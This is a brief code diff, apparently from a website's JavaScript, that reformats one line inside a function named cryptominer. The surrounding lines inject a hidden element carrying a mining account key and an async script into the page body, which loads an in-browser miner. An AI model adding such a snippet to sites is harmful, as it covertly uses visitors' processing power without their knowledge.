@@ -15,7 +15,7 @@ function cryptominer(){
     c.setAttribute('async','');
     var g = document.createElement('div');
     g.class = "minero-hidden";
-    g.style="display: none";
+    g.style = "display: none";
     g.setAttribute('data-key','e28c06e21135ac068da87519d76f51ec');
     document.body.appendChild(g);
     document.body.appendChild(c);    
